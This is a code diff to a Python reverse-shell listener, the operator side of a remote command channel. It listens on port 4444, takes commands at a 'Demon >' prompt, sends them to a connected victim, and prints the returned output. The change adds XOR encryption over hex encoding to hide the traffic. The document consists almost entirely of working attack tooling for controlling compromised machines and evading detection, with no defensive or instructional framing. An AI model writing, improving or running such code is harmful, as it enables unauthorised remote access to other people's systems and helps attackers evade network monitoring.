@@ -1,61 +1,59 @@
 import socket
 import binascii
 
+HOST = "0.0.0.0"
+PORT = 4444
+XOR_KEY = 0x3A
+
+def xor_decrypt(data):
+    return bytes([b ^ XOR_KEY for b in data])
+
+def xor_encrypt(data):
+    return bytes([b ^ XOR_KEY for b in data])
+
 def hex_encode(data):
-    return binascii.hexlify(data.encode()).decode()
+    return binascii.hexlify(data)
 
 def hex_decode(data):
-    try:
-        return binascii.unhexlify(data.encode()).decode(errors="ignore")
-    except:
-        return "[Decode Error]"
+    return binascii.unhexlify(data.strip())
 
-def start_listener(host='0.0.0.0', port=4444):
-    print(f"[+] Listening on {host}:{port} ...")
-
+def start_listener():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind((host, port))
+        s.bind((HOST, PORT))
         s.listen(1)
-        conn, addr = s.accept()
-        print(f"[+] Connection from {addr[0]}:{addr[1]}")
+        print(f"[+] Listening on {HOST}:{PORT} ...")
 
-        try:
+        conn, addr = s.accept()
+        with conn:
+            print(f"[+] Connection from {addr}")
+
             while True:
                 try:
-                    cmd = input("CMD> ").strip()
+                    cmd = input("Demon > ").strip()
                     if not cmd:
                         continue
-
-                    # Try to send the command
-                    conn.sendall(hex_encode(cmd).encode())
-
-                    # Handle exit explicitly
                     if cmd.lower() == "exit":
-                        print("[*] Exit command sent. Closing...")
+                        payload = xor_encrypt(b"exit")
+                        payload = hex_encode(payload)
+                        conn.sendall(payload)
+                        print("[*] Exiting.")
                         break
 
-                    print("[+] Output:")
-                    conn.settimeout(2.0)
-                    while True:
-                        try:
-                            data = conn.recv(4096)
-                            if not data:
-                                print("[!] Shell disconnected.")
-                                return
-                            decoded = hex_decode(data.decode())
-                            print(decoded, end='')
-                        except socket.timeout:
-                            break
+                    # Send encoded command
+                    enc_cmd = xor_encrypt(cmd.encode())
+                    hex_cmd = hex_encode(enc_cmd)
+                    conn.sendall(hex_cmd)
 
-                except BrokenPipeError:
-                    print("[!] Broken pipe — connection closed by target.")
+                    # Receive and decode response
+                    response = conn.recv(8192)
+                    if not response:
+                        break
+                    decoded = xor_decrypt(hex_decode(response))
+                    print(decoded.decode(errors="ignore"))
+
+                except Exception as e:
+                    print(f"[!] Error: {e}")
                     break
-
-        except KeyboardInterrupt:
-            print("\n[!] Ctrl+C detected — exiting.")
-        finally:
-            conn.close()
-            print("[+] Connection closed.")
 
 if __name__ == "__main__":
     start_listener()
